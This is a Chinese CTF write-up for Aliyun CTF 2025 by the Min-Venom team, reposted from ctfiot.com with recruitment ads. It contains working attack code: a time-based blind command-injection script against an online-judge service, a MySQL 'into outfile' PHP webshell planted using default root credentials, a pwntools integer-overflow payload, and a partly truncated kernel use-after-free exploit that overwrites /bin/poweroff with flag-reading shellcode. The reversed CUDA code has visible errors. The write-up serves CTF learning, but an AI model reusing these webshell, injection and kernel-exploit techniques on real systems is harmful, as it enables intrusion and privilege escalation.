# 阿里云CTF2025 writeup by Min-Venom

> 原文: https://www.ctfiot.com/229032.html
> ID: 229032

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)

Web 

ezoj

import _posixsubprocess
import os
_posixsubprocess.fork_exec([b"/bin/sh","-c", "ls"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)

能执行但是结果搞不出来，试试盲注

可能内存马

时间盲注回显但就是很慢

import base64

import requests
import time

flag=''
strings = "qwertyuiopasdfghjklzxcvbnm1234567890{}-"
payload1=f"""
import _posixsubprocess
import os
_posixsubprocess.fork_exec([b"/bin/sh","-c", "python3 /tmp/1.py"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)

"""

for i in range(1, 50):
    for j in strings:
        poc1=f"""import time
import os
if os.popen('cat /flag*').read({i})[{i}-1] == "{j}":
    time.sleep(2)
else:
    print("")
    """
        poc2=base64.b64encode(poc1.encode('utf-8')).decode()
        payload2 = f"""
import _posixsubprocess
import os
_posixsubprocess.fork_exec([b"/bin/sh","-c", "echo'{poc2}'|base64 -d>/tmp/1.py"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
"""

        resp1 = requests.post(
                "http://121.41.238.106:63837/api/submit",
                json={"problem_id": "0", "code": payload2},
            )
        start_time = time.time()
        resp2 = requests.post(
            "http://121.41.238.106:63837/api/submit",
            json={"problem_id": "0", "code": payload1},
        )

        end_time = time.time()
        delay = end_time - start_time

        if delay > 2:
            flag += j
            print(flag)
            break
    else:
        flag += "n"
        break

需要多跑几次，有些时候会抛出异常，可以重新改范围值

最后得到flag

aliyunctf{bb050a11-f64e-4137-8e94-59a37b0ed427}

打卡OK

目录扫描，

发现添加~符号可以查看源码，在login.php源码得到数据库账号密码

然后在ok.php源码得到adminer_481.php路径，访问该路径可以进行数据库连接，连接后能够执行sql语句，尝试sql写马。

但是登录的web账户权限不够，后面发现可以直接登录root账户，密码默认就是root，执行

select "&lt;?php eval($_POST['cmd']);?&gt;" into outfile "/var/www/html/shell.php"

访问 /shell.php进行命令执行

 Reverse: 

easy-cuda-rev

cuda逆向，先使用工具将encrypto部分的逻辑dump下来，直接逆逻辑就行，部分加密逻辑

int r4 = ctaid_x * ntid_x + tid_x;
if (tid_x>= ntid_x){
        return;
        }

uint8_t* rd3 = (uint8_t*)(rd1 + r4);
uint8_t rs13 = *rd3;
uint16_t rs14 = (uint16_t)r4;
uint16_t rs15 = rs14*73;
uint16_t rs16 = rs15+temp;
uint16_t rs17 = rs13 ^ rs16;
uint16_t rs18 = rs17 & 0xF0;
uint16_t rs19 = rs18 >> 4;
uint16_t rs20 = rs17 << 4;
uint16_t rs58 = rs19 | rs20;

for(int i=0;i<10485760;i++)
{
        uint8_t rs21 = T[rs58 & 0xFF]
        uint16_t rs22 = rs21 >> 4;
        uint16_t rs23 = rs21 << 4;
        uint16_t rs24 = rs22 | rs23;
        rs58 = rs24 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs26 = T[rs58 & 0xFF]
        uint16_t rs27 = rs26 >> 4;
        uint16_t rs28 = rs26 << 4;
        uint16_t rs29 = rs27 | rs28;
        rs58 = rs29 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs31 = T[rs58 & 0xFF]
        uint16_t rs32 = rs31 >> 4;
        uint16_t rs33 = rs31 << 4;
        uint16_t rs34 = rs32 | rs33;
        rs58 = rs34 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs36 = T[rs58 & 0xFF]
        uint16_t rs37 = rs36 >> 4;
        uint16_t rs38 = rs36 << 4;
        uint16_t rs39 = rs37 | rs38;
        rs58 = rs39 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs41 = T[rs58 & 0xFF]
        uint16_t rs42 = rs36 >> 4;
        uint16_t rs43 = rs36 << 4;
        uint16_t rs44 = rs37 | rs38;
        rs58 = rs44 ^ (uint16_t)i;
}

uint32_t r257 = -239350328;
uint32_t r256 = 387276957;
uint32_t r255 = 2027808484;
uint32_t r254 = -626627285;
uint32_t r253 = 1013904242;
uint32_t r252 = -1640531527

k = {-1556008596,-939442524,1013904242,338241895};
uint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];

for(int i=0;i<10485760;i+=8)
{
        v0 += (v1<<4+k0)^(v1 + r252)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r252)^(v0>>5 + k3)

        v0 += (v1<<4+k0)^(v1 + r253)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r253)^(v0>>5 + k3)

        v0 += (v1<<4+k0)^(v1 + r254)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r254)^(v0>>5 + k3)

        v0 += (v1<<4+k0)^(v1 + r255)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r255)^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1 + r256)^(v1>>5 + k1)
        v1 += (v0<<4+ k2)^(v0 + r256)^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1 + (r257 - 1013904242))^(v1>>5 + k1)
        v1 += (v0<<4+ k2)^(v0 + (r257 - 1013904242))^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1+ (r257 + 1640531527))^(v1>>5 + k1)
        v1 += (v0<<4+ k2)^(v0+ (r257 + 1640531527))^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1+ r257)^(v1>>5+ k1)
        v1 += (v0<<4+ k2)^(v0+ r257)^(v0>>5+ k3)
        
        r257 -= 239350328;
        r256 -= 239350328;
        r255 -= 239350328;
        r254 -= 239350328;
        r253 -= 239350328;
        r252 -= 239350328;
        
}

 Misc 

mba

打开附件 发现个py文件 主要就是解析并验证 MBA 表达式 主要flag的校验逻辑在这里

所以我们需要构造一个非MBA恒等式的表达式 使得z3无法证明expr==expr恒成立 拿到flag 即满足 expr!=expr

随后看.patch文件 扔给deepseek发现起存在整数溢出漏洞在construct_simplified_mba函数中 且跟py文件中的校验逻辑关联

所以可以利用整数溢出漏洞构造特殊系数 导致简化后表达式与原始表达式不等价构造exp 进而拿到flag

from pwn import *
r=remote("121.41.238.106",51845)
payload = b'95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y)+ 95791394*(x^y)'
r.sendline(payload)
r.interactive()
#aliyunctf{251e4bb0-b430-40cd-b09b-79a48b2ea2d8}

 Pwn: 

alimem

题目给了源码，直接分析源码

这段代码是一个 Linux 内核模块，定义了一个名为 alimem 的设备，它提供了一些操作接口来进行内存的分配、释放、读写等操作。以下是对代码的详细分析：

struct alimem_page {
    void *virt;
    phys_addr_t phys;
    atomic_t refcount;
    struct rcu_head rcu;
};

alimem_page

virt: 页面对应的虚拟地址。

phys: 页面对应的物理地址。

refcount: 原子计数器，用于追踪该页面的引用次数。

rcu: 用于 RCU 清理内存的结构体。

alimem_write

idx: 页面索引。

offset: 写入或读取的偏移量。

data: 数据缓冲区。

size: 操作的数据大小。

**pages[MAX_PAGES]**：存储分配的页面，最大支持 64 页。

pages_lock：读写信号量，用于保护对 pages 数组的并发访问，避免数据竞争。

free_page_rcu：这是一个 RCU 回调函数，在页面的引用计数为 0 时被调用。它会释放该页面的内存并清理相关结构。

使用 RCU 机制来延迟释放内存，以便在多个地方都可以安全地读取数据。

alimem_vma_open 和 alimem_vma_close：分别在内存映射打开和关闭时更新页面的引用计数。当引用计数为 0 时，页面会被清零并通过 RCPU 清理。

alimem_vm_ops：提供了 VMA 的操作函数，绑定 open 和 close 操作。

alimem_init：注册 alimem 设备。

alimem_exit：注销设备并释放所有分配的内存页面。

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
import _posixsubprocess
import os
_posixsubprocess.fork_exec([b"/bin/sh","-c", "ls"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```



```
import base64

import requests
import time

flag=''
strings = "qwertyuiopasdfghjklzxcvbnm1234567890{}-"
payload1=f"""
import _posixsubprocess
import os
_posixsubprocess.fork_exec([b"/bin/sh","-c", "python3 /tmp/1.py"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)

"""

for i in range(1, 50):
    for j in strings:
        poc1=f"""import time
import os
if os.popen('cat /flag*').read({i})[{i}-1] == "{j}":
    time.sleep(2)
else:
    print("")
    """
        poc2=base64.b64encode(poc1.encode('utf-8')).decode()
        payload2 = f"""
import _posixsubprocess
import os
_posixsubprocess.fork_exec([b"/bin/sh","-c", "echo'{poc2}'|base64 -d>/tmp/1.py"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
"""

        resp1 = requests.post(
                "http://121.41.238.106:63837/api/submit",
                json={"problem_id": "0", "code": payload2},
            )
        start_time = time.time()
        resp2 = requests.post(
            "http://121.41.238.106:63837/api/submit",
            json={"problem_id": "0", "code": payload1},
        )

        end_time = time.time()
        delay = end_time - start_time

        if delay > 2:
            flag += j
            print(flag)
            break
    else:
        flag += "n"
        break
```



```
aliyunctf{bb050a11-f64e-4137-8e94-59a37b0ed427}
```



```
select "&lt;?php eval($_POST['cmd']);?&gt;" into outfile "/var/www/html/shell.php"
```



```
int r4 = ctaid_x * ntid_x + tid_x;
if (tid_x>= ntid_x){
        return;
        }

uint8_t* rd3 = (uint8_t*)(rd1 + r4);
uint8_t rs13 = *rd3;
uint16_t rs14 = (uint16_t)r4;
uint16_t rs15 = rs14*73;
uint16_t rs16 = rs15+temp;
uint16_t rs17 = rs13 ^ rs16;
uint16_t rs18 = rs17 & 0xF0;
uint16_t rs19 = rs18 >> 4;
uint16_t rs20 = rs17 << 4;
uint16_t rs58 = rs19 | rs20;

for(int i=0;i<10485760;i++)
{
        uint8_t rs21 = T[rs58 & 0xFF]
        uint16_t rs22 = rs21 >> 4;
        uint16_t rs23 = rs21 << 4;
        uint16_t rs24 = rs22 | rs23;
        rs58 = rs24 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs26 = T[rs58 & 0xFF]
        uint16_t rs27 = rs26 >> 4;
        uint16_t rs28 = rs26 << 4;
        uint16_t rs29 = rs27 | rs28;
        rs58 = rs29 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs31 = T[rs58 & 0xFF]
        uint16_t rs32 = rs31 >> 4;
        uint16_t rs33 = rs31 << 4;
        uint16_t rs34 = rs32 | rs33;
        rs58 = rs34 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs36 = T[rs58 & 0xFF]
        uint16_t rs37 = rs36 >> 4;
        uint16_t rs38 = rs36 << 4;
        uint16_t rs39 = rs37 | rs38;
        rs58 = rs39 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs41 = T[rs58 & 0xFF]
        uint16_t rs42 = rs36 >> 4;
        uint16_t rs43 = rs36 << 4;
        uint16_t rs44 = rs37 | rs38;
        rs58 = rs44 ^ (uint16_t)i;
}

uint32_t r257 = -239350328;
uint32_t r256 = 387276957;
uint32_t r255 = 2027808484;
uint32_t r254 = -626627285;
uint32_t r253 = 1013904242;
uint32_t r252 = -1640531527

k = {-1556008596,-939442524,1013904242,338241895};
uint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];

for(int i=0;i<10485760;i+=8)
{
        v0 += (v1<<4+k0)^(v1 + r252)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r252)^(v0>>5 + k3)

        v0 += (v1<<4+k0)^(v1 + r253)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r253)^(v0>>5 + k3)

        v0 += (v1<<4+k0)^(v1 + r254)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r254)^(v0>>5 + k3)

        v0 += (v1<<4+k0)^(v1 + r255)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r255)^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1 + r256)^(v1>>5 + k1)
        v1 += (v0<<4+ k2)^(v0 + r256)^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1 + (r257 - 1013904242))^(v1>>5 + k1)
        v1 += (v0<<4+ k2)^(v0 + (r257 - 1013904242))^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1+ (r257 + 1640531527))^(v1>>5 + k1)
        v1 += (v0<<4+ k2)^(v0+ (r257 + 1640531527))^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1+ r257)^(v1>>5+ k1)
        v1 += (v0<<4+ k2)^(v0+ r257)^(v0>>5+ k3)
        
        r257 -= 239350328;
        r256 -= 239350328;
        r255 -= 239350328;
        r254 -= 239350328;
        r253 -= 239350328;
        r252 -= 239350328;
        
}
```



```
from pwn import *
r=remote("121.41.238.106",51845)
payload = b'95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y)+ 95791394*(x^y)'
r.sendline(payload)
r.interactive()
#aliyunctf{251e4bb0-b430-40cd-b09b-79a48b2ea2d8}
```



```
struct alimem_page {
    void *virt;
    phys_addr_t phys;
    atomic_t refcount;
    struct rcu_head rcu;
};
```



```
struct alimem_write {
    int idx;
    unsigned int offset;
    const char __user *data;
    size_t size;
};
struct alimem_read {
    int idx;
    unsigned int offset;
    char __user *data;
    size_t size;
};
```



```
static struct alimem_page *pages[MAX_PAGES];
static DECLARE_RWSEM(pages_lock);
```



```
static void free_page_rcu(struct rcu_head *rcu)
{
    struct alimem_page *page = container_of(rcu, struct alimem_page, rcu);
    free_pages((unsigned long)page->virt, PAGE_ORDER);
    kfree(page);
}
```



```
static void alimem_vma_close(struct vm_area_struct *vma)
{
    struct alimem_page *page = vma->vm_private_data;
    if (atomic_dec_and_test(&page->refcount)) {
        memset(page->virt, 0, PAGE_SIZE);
        call_rcu(&page->rcu, free_page_rcu);
    }
}
static void alimem_vma_open(struct vm_area_struct *vma)
{
    struct alimem_page *page = vma->vm_private_data;
    atomic_inc(&page->refcount);
}
```



```
static const struct vm_operations_struct alimem_vm_ops = {
    .open = alimem_vma_open,
    .close = alimem_vma_close,
};
```



```
static int alimem_mmap(struct file *filp, struct vm_area_struct *vma)
{
    int idx = vma->vm_pgoff;
    struct alimem_page *page;
    int ret = -EINVAL;
    if (idx < 0 || idx >= MAX_PAGES) return -EINVAL;
    if (vma->vm_end - vma->vm_start != PAGE_SIZE) {
        return -EINVAL;
    }
    rcu_read_lock();
    if(!pages[idx]) {
        rcu_read_unlock();
        return -EINVAL;
    }
    page = rcu_dereference(pages[idx]);
    if (page) {
        phys_addr_t phys = page->phys;
        vma->vm_ops = &alimem_vm_ops;
        vma->vm_private_data = page;
        vm_flags_set(vma, vma->vm_flags | VM_DONTEXPAND | VM_DONTDUMP);
        rcu_read_unlock();
        if (remap_pfn_range(vma, vma->vm_start,
                          phys >> PAGE_SHIFT,
                          vma->vm_end - vma->vm_start,
                          vma->vm_page_prot)) {
            return -EAGAIN;
        }

        atomic_inc(&page->refcount);
        return 0;
    }
    rcu_read_unlock();
    return ret;
}
```



```
static int __init alimem_init(void) { return misc_register(&alimem_dev); }
static void __exit alimem_exit(void) {
    int idx;
    struct alimem_page *page;
    down_write(&pages_lock);
    for (idx = 0; idx < MAX_PAGES; idx++) {
        page = pages[idx];
        if (page) {
            free_pages((unsigned long)page->virt, PAGE_ORDER);
            kfree(page);
            pages[idx] = NULL;
        }
    }
    up_write(&pages_lock);
    misc_deregister(&alimem_dev);
}
```



```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <string.h>
#include <sys/ioctl.h>
#define ALIMEM_ALLOC 0x1337
#define ALIMEM_FREE 0x1338
#define ALIMEM_WRITE 0x1339
#define ALIMEM_READ 0x133a
// 数据结构定义
struct alimem_write {
    int idx;
    unsigned int offset;
    char *data;
    size_t size;
};
struct alimem_read {
    int idx;
    unsigned int offset;
    char *data;
    size_t size;
};
char buf[0x1000];
long* ibuf = (long*)buf, log = 0;
void kalloc(int fd) {
    if (log) {
        printf("kallocn");
    }
    ioctl(fd, ALIMEM_ALLOC, 0);
}
void kfree(int fd, int idx) {
    if (log) {
        printf("kfree %dn", idx);
    }
    ioctl(fd, ALIMEM_FREE, &idx);
}
void kwrite(int fd, int idx, int off, size_t size, char *buf) {
    struct alimem_write aw = {
        .idx = idx,
        .offset = off,
        .data = buf,
        .size = size,
    };
    ioctl(fd, ALIMEM_WRITE, &aw);
}
void kread(int fd, int idx, int off, size_t size, char* buf) {
    struct alimem_read ar = {
        .idx = idx,
        .offset = off,
        .data = buf,
        .size = size
    };
    ioctl(fd, ALIMEM_READ, &ar);
}
long* addr[64] = {0}, stop = 0, t = 0, tt = 0;
int fds[0x200];
void kuaf_1(int fd) {
    int i = 0;
    while (!stop) {
        t = 0;
        tt = 0;
        kalloc(fd);
        ibuf[0] = 0x100;
        kwrite(fd, 0, 0, 0x100, buf);
        t = 1;
        kfree(fd, 0);
        if ((long)addr[0] <= 0) continue;
        ibuf[0] = 0x200;
        kalloc(fd);
        kwrite(fd, 0, 0, 0x100, buf);
        if (addr[0][0] == 0x200) {
            stop = 1;
            tt = 1;
            break;
        }
        kfree(fd, 0);
        tt = 1;
    }
}
void kuaf_2(int fd) {
    int i = 0;
    putchar('n');
    while (1) {
        while (!t) {};
        addr[0] = (long*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if ((long)addr[0] <= 0) {
            continue;
        }
        printf("r%d", i);
        i++;
        while (!tt) {};
        if (stop) {
            break;
        }
        addr[0] = 0;
    }
    putchar('n');
}
int main() {
    int fd = open("/dev/alimem", O_RDWR);
    pthread_t pt1, pt2;
    if (pthread_create(&pt1, NULL, (void* (
*)(void*
))kuaf_1, (void*)fd) != 0) {
        perror("pthread 1");
        exit(0);
    }
    if (pthread_create(&pt2, NULL, (void* (
*)(void*
))kuaf_2, (void*)fd)) {
        perror("pthread 2");
        exit(0);
    }
    pthread_join(pt1, NULL);
    pthread_join(pt2, NULL);
    printf("[+] Stage 1 finished.n");
    ibuf[0] = 0x300;
    kwrite(fd, 0, 0, 0x100, buf);
    if (addr[0][0] == 0x300) {
        kfree(fd, 0);
        if (addr[0][0] == 0x300) {
            printf("[-] UAF failed.n");
            exit(0);
        }
        printf("[+] UAF success.n");
    }
    else {
        printf("[-] UAF failed.n");
        exit(0);
    }
    // 打印内存内容
    for (int i = 0; i < 0x200; i++) {
        fds[i] = open("/bin/poweroff", O_RDONLY);
    }
    if (addr[0][0] == 0x300) {
        printf("[-] Spray file failed.n");
        exit(0);
    }
    printf("[+] Spray file success.n");
    addr[0][0x10 / 8] = 0x004f801f00000000;
    addr[0][0x48 / 8] = 0x8002;
    for (int i = 0; i < 0x200; i++) {
        unsigned char orw_elfcode[] = {
            0x7f, 0x45, 0x4c, 0x46, 0x2, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
            0x2, 0x0, 0x3e, 0x0, 0x1, 0x0, 0x0, 0x0, 0x78, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0,
            0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
            0x0, 0x40, 0x0, 0x38, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0,
            0x0, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0,
            0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb7, 0x0, 0x0, 0x0,
            0x0, 0x0, 0x0, 0x0, 0xb7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0,
            0x0, 0x0, 0x0, 0x0, 0x48, 0xbf, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x0, 0x0, 0x0, 0x57,
            0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xf,
            0x5, 0x48, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0xba, 0x0, 0x1, 0x0, 0x0, 0x48, 0x31, 0xc0,
            0xf, 0x5, 0xbf, 0x1, 0x0
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/0-1740535076.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/9-1740535078.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/8-1740535079.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/3-1740535079.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/2-1740535080.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/6-1740535080.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/3-1740535081.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/10-1740535082.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/7-1740535082.webp)